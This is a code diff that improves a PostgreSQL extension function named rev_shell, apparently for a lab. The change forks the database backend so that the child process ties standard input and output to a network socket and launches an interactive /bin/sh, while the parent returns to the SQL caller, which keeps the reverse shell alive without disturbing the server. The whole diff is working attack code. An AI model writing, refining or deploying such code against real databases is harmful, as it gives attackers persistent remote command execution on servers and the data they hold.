@@ -16,6 +16,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <sys/types.h>
 #include <unistd.h>
 #include <string.h>
 
@@ -52,13 +53,39 @@ rev_shell(PG_FUNCTION_ARGS)
         PG_RETURN_INT32(-3);
     }
 
-    dup2(sockfd, STDIN_FILENO);
-    dup2(sockfd, STDOUT_FILENO);
-    dup2(sockfd, STDERR_FILENO);
+    /*
+     * Keep the PostgreSQL backend responsive. The child owns the interactive
+     * shell; the parent closes its socket and returns to the SQL caller.
+     * This is intentionally lab-only: fork() from a backend is not a
+     * general-purpose PostgreSQL extension pattern.
+     */
+    pid_t pid = fork();
+    if (pid < 0)
+    {
+        close(sockfd);
+        PG_RETURN_INT32(-4);
+    }
 
-    execl("/bin/sh", "sh", NULL);
+    if (pid > 0)
+    {
+        close(sockfd);
+        PG_RETURN_INT32((int32) pid);
+    }
 
-    /* execl only returns on failure */
+    if (setsid() < 0)
+        _exit(10);
+
+    if (dup2(sockfd, STDIN_FILENO) < 0 ||
+        dup2(sockfd, STDOUT_FILENO) < 0 ||
+        dup2(sockfd, STDERR_FILENO) < 0)
+    {
+        close(sockfd);
+        _exit(11);
+    }
+
     close(sockfd);
-    PG_RETURN_INT32(-4);
+    execl("/bin/sh", "sh", "-i", NULL);
+
+    /* execl only returns on failure; do not return through PostgreSQL code. */
+    _exit(127);
 }
